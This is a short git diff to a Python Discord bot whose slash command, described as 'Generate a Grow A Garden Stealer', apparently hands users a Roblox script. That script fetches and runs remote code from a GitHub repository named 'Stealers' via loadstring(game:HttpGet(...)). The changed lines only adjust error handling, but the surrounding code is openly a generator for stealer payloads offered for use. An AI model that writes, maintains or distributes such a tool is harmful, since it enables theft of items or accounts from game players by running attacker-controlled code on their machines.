@@ -25,7 +25,6 @@ async def on_ready():
     except Exception as e:
         print(f"❌ Sync error: {e}")
 
-
 @tree.command(
     name="gen-grow-a-garden",
     description="Generate a Grow A Garden Stealer",
@@ -52,9 +51,12 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Narukisora/Stealers/r
         inline=False
     )
 
-    await interaction.followup.send(embed=embed)
+    try:
+        await interaction.followup.send(embed=embed)
     except discord.Forbidden:
-        await interaction.followup.send("❌ Could not send DM. Please enable them in server settings.", ephemeral=True)
-
+        await interaction.followup.send(
+            "❌ Could not send message. Please enable DMs or check bot permissions.",
+            ephemeral=True
+        )
 
 bot.run(TOKEN)
